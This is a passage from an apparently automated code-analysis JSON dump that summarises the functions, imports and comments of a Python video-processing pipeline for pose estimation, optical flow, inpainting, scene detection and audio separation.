          "def update_job_progress(job_id: int, progress: float, frames_processed: int = 0):\n\"\"\"Update job progress (0.0 to 1.0).\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\ncursor.execute(\n\"UPDATE jobs SET progress = ?, frames_processed = ?, status = 'processing' WHERE id = ?\",\n(progress, frames_processed, job_id)\n)\nconn.commit()\nconn.close()",
          "def complete_job(job_id: int, output_path: Optional[str] = None):\n\"\"\"Mark job as completed.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\ncursor.execute(\n\"UPDATE jobs SET status = 'completed', progress = 1.0, completed_at = ?, output_path = ? WHERE id = ?\",\n(datetime.now().isoformat(), output_path, job_id)\n)\nconn.commit()\nconn.close()",
          "def fail_job(job_id: int, error_message: str):\n\"\"\"Mark job as failed.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\ncursor.execute(\n\"UPDATE jobs SET status = 'failed', error_message = ?, completed_at = ? WHERE id = ?\",\n(error_message, datetime.now().isoformat(), job_id)\n)\nconn.commit()\nconn.close()",
          "def save_poses(video_id: int, frame_number: int, timestamp_ms: int,",
          "def get_poses_for_video(video_id: int) -> List[Dict]:\n\"\"\"Get all poses for a video.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\ncursor.execute(\n\"SELECT * FROM poses WHERE video_id = ? ORDER BY frame_number, person_id\",\n(video_id,)\n)\nrows = cursor.fetchall()\nconn.close()",
          "def save_transcript_segment(video_id: int, segment: Dict):\n\"\"\"Save a transcript segment.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\ncursor.execute(\"\"\"",
          "def get_transcripts_for_video(video_id: int) -> List[Dict]:\n\"\"\"Get all transcripts for a video.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\ncursor.execute(\n\"SELECT * FROM transcripts WHERE video_id = ? ORDER BY start_ms\",\n(video_id,)\n)\nrows = cursor.fetchall()\nconn.close()",
          "def get_completed_stages(video_id: int) -> List[str]:\n\"\"\"Get list of completed stages for a video.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\ncursor.execute(\"\"\"",
          "def get_failed_jobs(video_id: Optional[int] = None, max_retries: int = 3) -> List[Dict]:\n\"\"\"Get failed jobs eligible for retry.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\n\nif video_id:\ncursor.execute(\"\"\"",
          "def reset_job_for_retry(job_id: int) -> int:\n\"\"\"Reset a failed job for retry. Returns new job ID.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\n\n# Get original job info\ncursor.execute(\"SELECT video_id, job_type FROM jobs WHERE id = ?\", (job_id,))\nrow = cursor.fetchone()\nif not row:\nconn.close()",
          "def save_quality_metrics(video_id: int, frame_number: int, metrics: Dict):\n\"\"\"Save quality metrics for a frame.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\n\ncursor.execute(\"\"\"",
          "def get_quality_summary(video_id: int) -> Dict:\n\"\"\"Get quality metrics summary for a video.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\n\ncursor.execute(\"\"\"",
          "def get_low_quality_frames(video_id: int, threshold: float = 0.5) -> List[Dict]:\n\"\"\"Get frames with quality below threshold.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\n\ncursor.execute(\"\"\"",
          "def save_checkpoint(video_id: int, stage: str, data: Dict):\n\"\"\"Save processing checkpoint for a stage.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\n\n# Use a simple checkpoints table (create if needed)\ncursor.execute(\"\"\"",
          "def get_checkpoint(video_id: int, stage: str) -> Optional[Dict]:\n\"\"\"Get checkpoint data for a stage.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\n\ncursor.execute(\"\"\"",
          "def clear_checkpoint(video_id: int, stage: str):\n\"\"\"Clear checkpoint after successful completion.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\ncursor.execute(\n\"DELETE FROM checkpoints WHERE video_id = ? AND stage = ?\",\n(video_id, stage)\n)\nconn.commit()\nconn.close()",
          "def get_pipeline_stats() -> Dict:\n\"\"\"Get overall pipeline statistics.\"\"\"\nconn = get_connection()\ncursor = conn.cursor()\n\nstats = {}\n\ncursor.execute(\"SELECT status, COUNT(*) as count FROM videos GROUP BY status\")\nstats['videos'] = {row['status']: row['count'] for row in cursor.fetchall()}\n"
        ],
        "class_defs": [],
        "imports": [
          "import sqlite3",
          "from pathlib import Path",
          "from datetime import datetime",
          "from typing import Optional, List, Dict, Any",
          "import hashlib",
          "import json"
        ],
        "comments": [
          "# Videos table - stores metadata about input videos",
          "# Processing jobs table - tracks individual processing tasks",
          "# Pose results table - stores extracted pose data",
          "# Optical flow results",
          "# Transcripts table - stores audio transcription + translation",
          "# Quality metrics table",
          "# Create indexes for common queries",
          "# Video operations",
          "# Job operations",
          "# Pose operations",
          "# Transcript operations",
          "# Stage completion tracking for resume capability",
          "# Map job_type to stage names",
          "# Get original job info",
          "# Create new job (keeping old one for history)",
          "# Quality metrics operations",
          "# Checkpointing for resumable processing",
          "# Use a simple checkpoints table (create if needed)",
          "# Stats",
          "# Initialize database when run directly"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 6,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/quality_analyzer.py",
        "docstrings": [],
        "function_defs": [
          "def compute_blur_score(frame: np.ndarray) -> float:\n\"\"\"\nCompute blur score using Laplacian variance.\nHigher score = sharper image. Returns 0-1 normalized score.\n\nArgs:\nframe: BGR or grayscale image\n\nReturns:\nBlur quality score (0 = very blurry, 1 = very sharp)",
          "def compute_shake_score(",
          "def compute_occlusion_score(",
          "def compute_overall_quality(",
          "def analyze_frame(",
          "def analyze_video_quality(",
          "def identify_problem_segments("
        ],
        "class_defs": [],
        "imports": [
          "import cv2",
          "import numpy as np",
          "from typing import Dict, List, Tuple, Optional",
          "from pathlib import Path",
          "import sys"
        ],
        "comments": [
          "# Laplacian variance - higher = sharper",
          "# Normalize to 0-1 range",
          "# Typical sharp images: 500-2000+",
          "# Blurry images: 10-100",
          "# Map: 0-500 -> 0-1",
          "# Convert to grayscale",
          "# Detect features",
          "# Match features",
          "# Get matched points",
          "# Estimate affine transform",
          "# Extract translation component",
          "# Normalize: 0 shift = 1.0, max_shift+ = 0.0",
          "# Compute summary statistics",
          "# Track specific issues",
          "# Don't forget last segment",
          "# Find problem segments"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 7,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/__init__.py",
        "docstrings": [],
        "function_defs": [
          "def __getattr__(name):"
        ],
        "class_defs": [],
        "imports": [
          "from .enhance_engine import VideoEnhancer",
          "from .enhance_engine import EnhancementConfig",
          "from .enhance_engine import EnhancementProfile",
          "from .scene_detection import SceneDetector",
          "from .scene_detection import analyze_video",
          "from .evolutionary_optimizer import EvolutionaryOptimizer",
          "from .m2_acceleration import M2Accelerator",
          "from .training import EvolutionaryTrainer",
          "from .checkpointing import CheckpointManager"
        ],
        "comments": [
          "# Lazy imports to avoid circular dependencies"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/inpainting.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def compute_flow(",
          "def warp_frame(",
          "def inpaint_frame(",
          "def propagate_and_inpaint(",
          "def inpaint_video(",
          "def __init__(",
          "def detect_from_tracking(",
          "def detect_from_poses(",
          "def create_manual_mask(",
          "def inpaint_video_simple(",
          "def mask_generator():",
          "def inpaint_from_tracking("
        ],
        "class_defs": [
          "class InpaintingResult:",
          "class FlowGuidedInpainter:",
          "class OcclusionDetector:"
        ],
        "imports": [
          "import cv2",
          "import numpy as np",
          "from typing import List, Dict, Optional, Tuple, Generator",
          "from dataclasses import dataclass",
          "from pathlib import Path",
          "from tqdm import tqdm",
          "import json",
          "import sys"
        ],
        "comments": [
          "# Initialize optical flow",
          "# Create coordinate grid",
          "# Apply flow",
          "# Warp image",
          "# Propagate from each reference frame",
          "# Warp reference frame to target",
          "# Valid pixels: visible in reference and occluded in target",
          "# Copy valid pixels",
          "# Inpaint remaining holes with OpenCV",
          "# Buffer for reference frames",
          "# Read all frames and masks into memory (for small videos)",
          "# For large videos, use sliding window approach",
          "# Process each frame",
          "# No occlusion, write directly",
          "# Gather reference frames",
          "# Look at nearby frames",
          "# Compute flow from reference to target",
          "# Propagate and inpaint",
          "# If overall confidence is low, mark bounding box as occluded",
          "# Mark low-visibility keypoint regions",
          "# Draw circle around occluded keypoint",
          "# No pose detected - could be full occlusion",
          "# But we don't know where, so leave mask empty",
          "# Create static mask",
          "# Generate same mask for each frame",
          "# Load tracking data",
          "# Get video dimensions",
          "# Generate masks from tracking",
          "# Inpaint"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": [
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/optical_flow.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def reset(self):\n\"\"\"Reset the estimator state.\"\"\"\nself.prev_gray = None\n\ndef compute(\nself,\nframe1: np.ndarray,\nframe2: np.ndarray\n) -> np.ndarray:\n\"\"\"",
          "def compute(",
          "def compute_sequential(self, frame: np.ndarray) -> Optional[np.ndarray]:\n\"\"\"\nCompute flow from previous frame to current frame.\nUse this for video processing.\n\nArgs:\nframe: Current frame (BGR or grayscale)\n\nReturns:\nFlow field or None if this is the first frame",
          "def flow_to_color(flow: np.ndarray, max_flow: Optional[float] = None) -> np.ndarray:\n\"\"\"\nConvert optical flow to HSV color visualization.\n\nArgs:\nflow: Flow field (H, W, 2)\nmax_flow: Maximum flow magnitude for normalization\n\nReturns:\nBGR image showing flow direction as hue, magnitude as saturation",
          "def compute_flow_stats(flow: np.ndarray) -> Dict:\n\"\"\"\nCompute statistics about an optical flow field.\n\nArgs:\nflow: Flow field (H, W, 2)\n\nReturns:\nDictionary with flow statistics\n\"\"\"",
          "def estimate_camera_motion(flow: np.ndarray) -> Dict:\n\"\"\"\nEstimate global camera motion from optical flow.\n\nArgs:\nflow: Flow field (H, W, 2)\n\nReturns:\nDictionary with estimated camera motion parameters\n\"\"\"",
          "def save_flow(flow: np.ndarray, path: str):\n\"\"\"\nSave optical flow to disk in .flo format.\n\nArgs:\nflow: Flow field (H, W, 2)\npath: Output path\n\"\"\"",
          "def load_flow(path: str) -> np.ndarray:\n\"\"\"\nLoad optical flow from .flo file.\n\nArgs:\npath: Path to .flo file\n\nReturns:\nFlow field (H, W, 2)\n\"\"\"",
          "def process_video_flow("
        ],
        "class_defs": [
          "class OpticalFlowEstimator:"
        ],
        "imports": [
          "import cv2",
          "import numpy as np",
          "from typing import Tuple, Optional, List, Dict",
          "from pathlib import Path",
          "from tqdm import tqdm",
          "from .video_utils import VideoReader",
          "import sys",
          "import json"
        ],
        "comments": [
          "# DIS presets",
          "# Optionally use Farneback as fallback",
          "# Convert to grayscale if needed",
          "# Compute flow",
          "# Compute magnitude and angle",
          "# Normalize",
          "# Create HSV image",
          "# Sample points in a grid",
          "# Estimate affine transform (translation + rotation + scale)",
          "# Extract parameters",
          "# FLO format: magic number (float32) + width + height + data",
          "# Compute flow",
          "# Save flow",
          "# Compute stats",
          "# Optionally save visualization",
          "# Save metadata"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/export_bvh.py",
        "docstrings": [],
        "function_defs": [
          "def compute_joint_angles(keypoints):\n\"\"\"\nCompute joint angles from 2D keypoints.\nReturns array of angles for BVH motion data.\n\"\"\"",
          "def get_point(name):",
          "def export_person_bvh(poses_data, person_idx, output_path, fps=1):\n\"\"\"\nExport BVH file for a specific person across all frames.\n\nArgs:\nposes_data: List of frame pose data\nperson_idx: Which person to export (0, 1, 2...)\noutput_path: Output BVH file path\nfps: Frame rate\n\"\"\"",
          "def export_all_bvh(poses_file, output_dir, fps=1):\n\"\"\"\nExport BVH files for all detected people.\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import numpy as np",
          "from pathlib import Path"
        ],
        "comments": [
          "# Default angles (rest pose)",
          "# Hip position (root)",
          "# Scale to reasonable range",
          "# Spine rotation based on shoulder-hip alignment",
          "# Compute torso twist",
          "# Arm angles",
          "# Collect motion data",
          "# Person not visible, use default pose",
          "# Write BVH file",
          "# Find max people in any frame",
          "# Export each person"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/scene_detection.py",
        "docstrings": [],
        "function_defs": [
          "def duration(self) -> float:",
          "def frame_count(self) -> int:",
          "def to_dict(self) -> Dict:",
          "def __init__(self, threshold: float = 30.0, min_scene_length: int = 15):\n\"\"\"\nArgs:\nthreshold: Threshold for scene cut detection (higher = less sensitive)\nmin_scene_length: Minimum frames for a scene\n\"\"\"",
          "def detect_scenes(self, video_path: str, sample_rate: int = 1) -> List[SceneInfo]:\n\"\"\"\nDetect scene boundaries and analyze content.\n\nArgs:\nvideo_path: Path to video file\nsample_rate: Process every Nth frame (1 = all frames)\n\nReturns:\nList of SceneInfo objects",
          "def _estimate_motion(self, prev_gray: np.ndarray, curr_gray: np.ndarray) -> float:\n\"\"\"Estimate motion between frames using optical flow\"\"\"\nflow = cv2.calcOpticalFlowFarneback(\nprev_gray, curr_gray, None,\npyr_scale=0.5, levels=3, winsize=15,\niterations=3, poly_n=5, poly_sigma=1.2, flags=0\n)\n\n# Calculate magnitude\nmagnitude = np.sqrt(flow[..., 0]**2 + flow[..., 1]**2)",
          "def _analyze_frame(self, frame: np.ndarray, gray: np.ndarray) -> Dict:\n\"\"\"Analyze a single frame for various metrics\"\"\"\n# Brightness\nbrightness = np.mean(gray)\n\n# Contrast\ncontrast = np.std(gray)\n\n# Sharpness (Laplacian variance)\nlaplacian = cv2.Laplacian(gray, cv2.CV_64F)",
          "def _estimate_noise(self, gray: np.ndarray) -> float:\n\"\"\"Estimate noise level using median absolute deviation\"\"\"\n# High-pass filter\nkernel = np.array([[-1, -1, -1],\n[-1,  8, -1],\n[-1, -1, -1]]) / 8.0\n\nhigh_pass = cv2.filter2D(gray.astype(np.float32), -1, kernel)\n\n# MAD-based noise estimate",
          "def _create_scene_info(",
          "def _classify_scene_type(",
          "def _classify_motion(self, motion: float) -> MotionLevel:\n\"\"\"Classify motion level\"\"\"\nif motion < 0.5:\nreturn MotionLevel.STATIC\nelif motion < 2:\nreturn MotionLevel.SLOW\nelif motion < 5:\nreturn MotionLevel.MODERATE\nelif motion < 10:\nreturn MotionLevel.FAST",
          "def _recommend_denoise(",
          "def _recommend_sharpen(self, sharpness: float, scene_type: SceneType) -> float:\n\"\"\"Recommend sharpen strength based on content\"\"\"\n# Less sharpening for already sharp content\nif sharpness > 500:\nbase = 0.1\nelif sharpness > 200:\nbase = 0.2\nelif sharpness > 100:\nbase = 0.3\nelse:",
          "def _recommend_upscale_model(self, scene_type: SceneType, saturation: float) -> str:\n\"\"\"Recommend upscale model based on content\"\"\"\nif scene_type == SceneType.ANIMATION or saturation > 150:\nreturn \"realesrgan-anime\"\nreturn \"realesrgan\"\n\n\ndef analyze_video(video_path: str, output_json: Optional[str] = None) -> List[SceneInfo]:\n\"\"\"",
          "def analyze_video(video_path: str, output_json: Optional[str] = None) -> List[SceneInfo]:\n\"\"\"\nAnalyze a video and return scene information.\n\nArgs:\nvideo_path: Path to video\noutput_json: Optional path to save analysis as JSON\n\nReturns:\nList of SceneInfo objects"
        ],
        "class_defs": [
          "class SceneType(Enum):",
          "class MotionLevel(Enum):",
          "class SceneInfo:",
          "class SceneDetector:"
        ],
        "imports": [
          "import cv2",
          "import numpy as np",
          "from pathlib import Path",
          "from dataclasses import dataclass, field",
          "from typing import List, Tuple, Dict, Optional, Any",
          "from enum import Enum",
          "import json",
          "from collections import deque",
          "import sys"
        ],
        "comments": [
          "# Quality metrics",
          "# Recommended settings",
          "# Additional metadata",
          "# Face detection",
          "# Motion tracking",
          "# Scene accumulation",
          "# Convert to grayscale for analysis",
          "# Calculate histogram",
          "# Scene cut detection using histogram difference",
          "# Potential scene cut",
          "# Motion estimation",
          "# Collect frame metrics",
          "# Add final boundary",
          "# Create SceneInfo objects",
          "# Get metrics for this scene",
          "# Aggregate metrics",
          "# Calculate magnitude",
          "# Brightness",
          "# Contrast",
          "# Sharpness (Laplacian variance)",
          "# Noise estimation (high-frequency content in flat areas)",
          "# Face detection",
          "# Color analysis",
          "# Edge density (complexity)",
          "# High-pass filter",
          "# MAD-based noise estimate",
          "# Average metrics",
          "# Classify scene type",
          "# Classify motion level",
          "# Calculate recommended settings",
          "# Low light scene",
          "# Animation detection (high saturation, clean edges)",
          "# Face closeup",
          "# Dialogue (faces + low motion)",
          "# Action (high motion)",
          "# Landscape (low edge density, low motion)",
          "# Base on noise level",
          "# Adjust for motion (less denoise for high motion - preserve detail)",
          "# Adjust for scene type",
          "# Less sharpening for already sharp content",
          "# Adjust for scene type"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 8,
        "error_handling": 0,
        "decorators": [
          "@dataclass",
          "@property",
          "@property"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/pose_estimation.py",
        "docstrings": [],
        "function_defs": [
          "def get_model_path(model_complexity: int = 1) -> str:\n\"\"\"\nGet path to MediaPipe pose model, downloading if needed.\n\nArgs:\nmodel_complexity: 0=Lite, 1=Full, 2=Heavy\n\nReturns:\nPath to model file\n\"\"\"",
          "def __init__(",
          "def __enter__(self):",
          "def __exit__(self, exc_type, exc_val, exc_tb):",
          "def close(self):\n\"\"\"Release resources.\"\"\"\nif hasattr(self, 'detector'):\nself.detector.close()\n\ndef detect(self, frame: np.ndarray) -> Optional[PoseResult]:\n\"\"\"",
          "def detect(self, frame: np.ndarray) -> Optional[PoseResult]:\n\"\"\"\nDetect pose in a single frame.\n\nArgs:\nframe: BGR image (OpenCV format)\n\nReturns:\nPoseResult or None if no pose detected\n\"\"\"",
          "def detect_batch(",
          "def get_coco_keypoints(self, result: PoseResult) -> List[Dict]:\n\"\"\"Extract COCO-format 17 keypoints from full MediaPipe result.\"\"\"\nif result is None:\nreturn []\n\ncoco_kps = []\nkp_dict = {kp['name']: kp for kp in result.keypoints}\n\nfor name in COCO_KEYPOINTS:\nif name in kp_dict:",
          "def draw_pose(",
          "def poses_to_dict(results: List[Optional[PoseResult]], frame_numbers: List[int]) -> Dict:\n\"\"\"\nConvert list of pose results to a serializable dictionary.\n\nArgs:\nresults: List of PoseResult objects\nframe_numbers: Corresponding frame numbers\n\nReturns:\nDictionary ready for JSON serialization",
          "def process_video_poses("
        ],
        "class_defs": [
          "class PoseResult:",
          "class PoseEstimator:"
        ],
        "imports": [
          "import cv2",
          "import numpy as np",
          "import mediapipe as mp",
          "from mediapipe.tasks import python",
          "from mediapipe.tasks.python import vision",
          "from typing import List, Dict, Optional, Tuple",
          "from dataclasses import dataclass",
          "from pathlib import Path",
          "from tqdm import tqdm",
          "import urllib.request",
          "import os",
          "from .video_utils import VideoReader",
          "import sys",
          "import json"
        ],
        "comments": [
          "# MediaPipe landmark names (33 points)",
          "# Subset for common animation (17 keypoints like COCO)",
          "# Skeleton connections for visualization",
          "# Model download URL",
          "# Convert BGR to RGB",
          "# Create MediaPipe Image",
          "# Detect poses",
          "# Use first detected pose",
          "# Convert landmarks to keypoints",
          "# Compute bounding box from visible keypoints",
          "# Add padding",
          "# Draw skeleton connections",
          "# Draw keypoints",
          "# Draw bounding box",
          "# Test with webcam",
          "# Process video file"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": [
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/pipeline.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def scan_input_directory(self, limit: int = None) -> List[Dict]:\n\"\"\"\nScan input directory for new videos.\n\nArgs:\nlimit: Maximum number of videos to return (None for all)\n\nReturns:\nList of video metadata dicts\n\"\"\"",
          "def ingest_videos(self) -> int:\n\"\"\"\nIngest new videos from input directory.\n\nReturns:\nNumber of videos ingested\n\"\"\"",
          "def process_video(",
          "def process_all_pending(self, stages: List[str] = None) -> List[Dict]:\n\"\"\"\nProcess all pending videos.\n\nReturns:\nList of processing results\n\"\"\"",
          "def get_stats(self) -> Dict:\n\"\"\"Get pipeline statistics.\"\"\"\nreturn db.get_pipeline_stats()\n\ndef retry_failed_jobs(self, max_retries: int = 3) -> Dict:\n\"\"\"",
          "def retry_failed_jobs(self, max_retries: int = 3) -> Dict:\n\"\"\"\nRetry failed jobs with exponential backoff.\n\nArgs:\nmax_retries: Maximum retry attempts per job\n\nReturns:\nRetry results\n\"\"\"",
          "def get_quality_report(self, video_id: int = None) -> Dict:\n\"\"\"\nGet quality report for video(s).\n\nArgs:\nvideo_id: Specific video ID or None for all\n\nReturns:\nQuality report dictionary\n\"\"\"",
          "def export_dataset(self, output_path: str = None, format: str = 'coco') -> Dict:\n\"\"\"\nExport processed data as a dataset.\n\nArgs:\noutput_path: Output directory path\nformat: Export format ('coco', 'json', 'parquet')\n\nReturns:\nExport results dictionary",
          "def process_video_worker(args):\n\"\"\"Worker function for parallel processing.\"\"\"\nvideo_id, pipeline_config = args\npipeline = MotionPipeline(**pipeline_config)\nreturn pipeline.process_video(video_id)\n\n\ndef main():\n\"\"\"CLI entry point.\"\"\"",
          "def main():\n\"\"\"CLI entry point.\"\"\"\nimport argparse\n\nparser = argparse.ArgumentParser(description=\"Motion Pipeline - Video Processing\")\nsubparsers = parser.add_subparsers(dest='command', help='Commands')\n\n# Ingest command\ningest_parser = subparsers.add_parser('ingest', help='Ingest videos from input directory')\n"
        ],
        "class_defs": [
          "class MotionPipeline:"
        ],
        "imports": [
          "import json",
          "import multiprocessing as mp",
          "from pathlib import Path",
          "from typing import Dict, List, Optional",
          "from datetime import datetime",
          "from tqdm import tqdm",
          "import traceback",
          "import time",
          "from . import database as db",
          "from . import video_utils",
          "from . import pose_estimation",
          "from . import optical_flow",
          "from . import audio_transcribe",
          "from . import tracking",
          "from . import camera_motion",
          "from . import pose_3d",
          "from . import bvh_export",
          "from . import stabilization",
          "from . import inpainting",
          "from . import quality_analyzer",
          "import os",
          "from . import dataset_export",
          "import argparse",
          "from . import dataset_export",
          "from . import dataset_export"
        ],
        "comments": [
          "# Create directories",
          "# Pipeline settings",
          "# Retry settings",
          "# Initialize database",
          "# Use os.walk with followlinks=True to follow symlinks",
          "# Skip hidden directories and backup folders",
          "# Check for resume capability",
          "# Create output directory for this video",
          "# Track which video to process (may change after stabilization)",
          "# Stage 0a: Quality Analysis (before processing)",
          "# Save frame-level metrics to database",
          "# Find problem segments",
          "# Log quality warning if needed",
          "# Stage 0: Video Stabilization (optional preprocessing)",
          "# First analyze shakiness",
          "# Stage 1: Pose Estimation",
          "# Save poses",
          "# Save to database",
          "# Stage 2: Optical Flow",
          "# Save metadata",
          "# Stage 3: Person Tracking",
          "# Stage 4: Camera Motion",
          "# Stage 5: 3D Pose Lifting",
          "# Export to BVH if requested",
          "# Stage 6: Video Inpainting (requires tracking data)",
          "# Stage 7: Audio Transcription",
          "# Save transcripts to database",
          "# Mark video as complete if all stages succeeded",
          "# Exponential backoff",
          "# Map job_type back to stage name",
          "# Process just this stage",
          "# Get summary for all videos",
          "# Ingest command",
          "# Process command",
          "# Retry command",
          "# Quality command",
          "# Status command",
          "# Test command",
          "# Export command",
          "# Stats command",
          "# Process all pending with resume support",
          "# Quick test with a video file"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 3,
        "error_handling": 26,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/audio_separation.py",
        "docstrings": [],
        "function_defs": [
          "def separate_vocals_from_background(audio_path: str, output_dir: str) -> dict:\n\"\"\"\nUse Demucs to separate vocals from background sounds.\nThis removes water splashing, floor squeaks, ambient noise.\n\nReturns paths to: vocals, drums, bass, other (background)\n\"\"\"",
          "def analyze_voice_segments(vocals_path: str, sr: int = 22050) -> list:\n\"\"\"\nAnalyze vocal track to identify voice segments and their characteristics.\nReturns list of segments with start_time, end_time, pitch_stats\n\"\"\"",
          "def remove_female_voice_segments(vocals_path: str, output_path: str,",
          "def process_video_audio(video_path: str, output_video_path: str,",
          "def quick_filter_audio(audio_path: str, output_path: str) -> str:\n\"\"\"\nQuick CPU-only female voice removal without full Demucs separation.\nUses spectral filtering based on pitch ranges.\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import subprocess",
          "import numpy as np",
          "from pathlib import Path",
          "import tempfile",
          "import shutil",
          "import librosa",
          "import soundfile as sf",
          "from scipy import signal",
          "import sys"
        ],
        "comments": [
          "# Audio processing",
          "# Run Demucs separation",
          "# Find output files",
          "# Get pitch (F0) using pyin for better accuracy",
          "# Frame duration",
          "# Analyze segments",
          "# Create mask to attenuate female segments",
          "# Strongly attenuate female voice",
          "# Ambiguous range - partial attenuation",
          "# Apply smooth mask (avoid clicks)",
          "# Apply mask",
          "# Save",
          "# 1. Extract audio from video",
          "# 2. Separate vocals from background",
          "# 3. Filter female voice from vocals",
          "# 4. Mix male vocals with background (if keeping)",
          "# Load both tracks",
          "# Ensure same length",
          "# Mix",
          "# Normalize",
          "# 5. Combine with video",
          "# Compute spectrogram",
          "# Get frequency bins",
          "# Female fundamental frequency range: ~165-255 Hz",
          "# Also attenuate harmonics (2x, 3x, 4x)",
          "# Create attenuation mask",
          "# Apply mask",
          "# Reconstruct",
          "# Quick spectral filtering (no Demucs)",
          "# Full pipeline with Demucs"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/pose_3d.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def lift(self, keypoints_2d: List[Dict]) -> Optional[Pose3D]:\n\"\"\"\nLift 2D keypoints to 3D.\n\nArgs:\nkeypoints_2d: List of 2D keypoints with x, y, visibility, (z optional)\n\nReturns:\nPose3D or None if lifting failed\n\"\"\"",
          "def _estimate_height(self, kp_dict: Dict) -> Optional[float]:\n\"\"\"Estimate person height from keypoints.\"\"\"\n# Try different height estimation methods\n\n# Method 1: Head to ankle\nif 'nose' in kp_dict and 'left_ankle' in kp_dict:\nnose = kp_dict['nose']\nankle = kp_dict['left_ankle']\nif nose['visibility'] > 0.5 and ankle['visibility'] > 0.5:\nreturn abs(ankle['y'] - nose['y']) * 1.1  # Head above nose",
          "def _estimate_z_geometric(",
          "def _apply_bone_constraints(",
          "def _apply_temporal_smoothing(self, pose: Pose3D) -> Pose3D:\n\"\"\"Apply temporal smoothing across frames.\"\"\"\nself.prev_poses.append(pose)\nif len(self.prev_poses) > self.max_history:\nself.prev_poses.pop(0)\n\nif len(self.prev_poses) < 2:\nreturn pose\n\n# Exponential moving average",
          "def reset(self):\n\"\"\"Reset temporal state.\"\"\"\nself.prev_poses = []\n\n\ndef pose_3d_to_dict(pose: Pose3D) -> Dict:\n\"\"\"Convert Pose3D to serializable dictionary.\"\"\"",
          "def pose_3d_to_dict(pose: Pose3D) -> Dict:\n\"\"\"Convert Pose3D to serializable dictionary.\"\"\"\nreturn {\n'joints': {name: pos.tolist() for name, pos in pose.joints.items()},\n'confidence': pose.confidence,\n'estimated_height': pose.estimated_height\n}\n\n\ndef process_video_3d_poses(",
          "def process_video_3d_poses("
        ],
        "class_defs": [
          "class Pose3D:",
          "class Pose3DLifter:"
        ],
        "imports": [
          "import numpy as np",
          "from typing import List, Dict, Optional, Tuple",
          "from dataclasses import dataclass",
          "import json",
          "from .video_utils import VideoReader",
          "from .pose_estimation import PoseEstimator",
          "from tqdm import tqdm",
          "import sys"
        ],
        "comments": [
          "# Standard human body proportions (relative to height = 1.0)",
          "# Joint hierarchy for skeleton",
          "# Bone lengths relative to height",
          "# Convert to dict for easy access",
          "# Estimate person height from visible keypoints",
          "# Create 3D joints",
          "# Get z coordinate",
          "# MediaPipe z is relative depth, scale it",
          "# Estimate z from limb geometry",
          "# Apply bone length constraints",
          "# Calculate average confidence",
          "# Temporal smoothing",
          "# Try different height estimation methods",
          "# Method 1: Head to ankle",
          "# Method 2: Shoulder to ankle",
          "# Method 3: Hip to ankle (half body)",
          "# Default z = 0 (at camera plane)",
          "# Arms typically extend forward/back",
          "# Check if arm is bent (elbow angle)",
          "# Calculate apparent arm length",
          "# If apparent length is shorter, arm is pointing toward/away from camera",
          "# For now, return as-is",
          "# A more sophisticated version would use inverse kinematics",
          "# Exponential moving average",
          "# Weighted average",
          "# Detect 2D pose",
          "# Lift to 3D"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 4,
        "error_handling": 0,
        "decorators": [
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/batch_upscale.py",
        "docstrings": [],
        "function_defs": [
          "def setup_upscaler():\n\"\"\"Initialize Real-ESRGAN upscaler.\"\"\"\nmodel = RRDBNet(\nnum_in_ch=3, num_out_ch=3,\nnum_feat=64, num_block=23, num_grow_ch=32, scale=4\n)\n\nupsampler = RealESRGANer(\nscale=4,\nmodel_path='/app/models/upscale/RealESRGAN_x4plus.pth',",
